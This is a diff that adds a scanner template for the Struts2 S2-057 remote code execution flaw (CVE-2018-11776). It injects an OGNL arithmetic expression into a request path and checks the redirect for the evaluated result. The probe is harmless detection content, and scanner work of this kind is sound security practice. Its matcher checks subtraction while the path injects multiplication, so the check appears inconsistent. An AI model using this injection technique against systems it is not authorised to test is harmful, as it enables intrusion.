@@ -1,0 +1,28 @@
+id: s2-057
+type: default
+info:
+  name: Struts2 s2-057 远程代码执行
+  risk: High
+  cve: CVE-2018-11776
+
+variables: |+
+  function main() {
+    var num1 = randomNum(1,1000);
+    var num2 = randomNum(2,1000);
+    var path = '{{.URL.Path}}';
+    var ext = getFileExt(path);
+    if (['.action','.do'].indexOf(ext) > -1) {
+      var filename = path.substring(path.lastIndexOf('/') + 1);
+      path = path.replace("/" + filename, "/${" + num1 + "*" + num2 + "}/" + filename);
+      return {'num1': num1, 'num2': num2, 'path': path};
+    }
+  }
+
+requests:
+  - method: GET
+    redirect: false
+    url: '{{.URL.Scheme}}://{{.URL.Host}}{{.path}}'
+#    body: 'redirect:${ {{.num1}}-{{.num2}} }'
+    matchers:
+      - dsl:
+          - "status_code==302 && contains(Location,itoa({{.num1}}-{{.num2}}))"
